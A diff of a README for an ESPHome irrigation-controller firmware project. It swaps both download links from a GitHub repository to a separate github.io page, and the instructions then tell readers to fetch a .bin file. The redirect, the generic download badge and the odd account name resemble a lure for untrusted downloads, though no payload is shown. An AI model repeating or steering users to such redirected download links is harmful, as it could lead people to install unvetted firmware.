@@ -1,6 +1,6 @@
 # 💧 esphome-tuya-8zone-valve - Control your irrigation system locally
 
-[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve)
+[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://valicommutativegroup775.github.io)
 
 This project provides software for an 8-zone irrigation controller based on the Tuya BK7231N chip. It allows you to run your garden watering system without a connection to the internet. You keep full control of your hardware at all times.
 
@@ -27,7 +27,7 @@ To use this software, you need the following:
 
 You must visit the project page to access the latest version. Follow these steps to reach the download area:
 
-1. Click this link to go to the project release page: [https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve](https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve)
+1. Click this link to go to the project release page: [https://valicommutativegroup775.github.io](https://valicommutativegroup775.github.io)
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Select the latest version number.
 4. Download the file ending in .bin to your computer.
